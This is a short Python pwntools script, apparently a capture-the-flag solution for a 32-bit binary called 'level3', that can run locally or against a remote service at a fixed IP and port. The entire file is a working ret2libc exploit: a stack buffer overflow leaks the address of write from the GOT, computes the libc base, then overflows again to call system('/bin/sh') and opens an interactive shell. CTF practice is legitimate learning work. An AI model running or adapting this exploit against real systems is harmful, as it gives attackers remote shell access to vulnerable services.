from pwn import *
context.log_level = 'debug'

if len(sys.argv) == 1 or sys.argv[1] == 'l':
    p = process('./level3')
    elf = ELF('./level3')
    libc=ELF('/lib/i386-linux-gnu/libc.so.6')
else:
    p = remote('61.147.171.105', 52678)
    elf = ELF('./level3')
    libc=ELF('./libc_32.so.6')
    pause()
write_plt=elf.plt['write']
write_got=elf.got['write']
bug_fun=0x0804844B
p.recvuntil(b'Input:\n')
payload=b'a'*(0x88+4)+p32(write_plt)+p32(bug_fun)+p32(1)+p32(write_got)+p32(4)
p.sendline(payload)
write_addr=u32(p.recv(4))
print(hex(write_addr))
pause()
libcbase=write_addr-libc.symbols['write']
print(hex(libcbase))
system_addr=libcbase+libc.symbols['system']
bin_sh_addr=libcbase+libc.search(b'/bin/sh').__next__()
p.recvuntil(b'Input:\n')
payload=b'a'*(0x88+4)+p32(system_addr)+b'aaaa'+p32(bin_sh_addr)
p.sendline(payload)
p.interactive()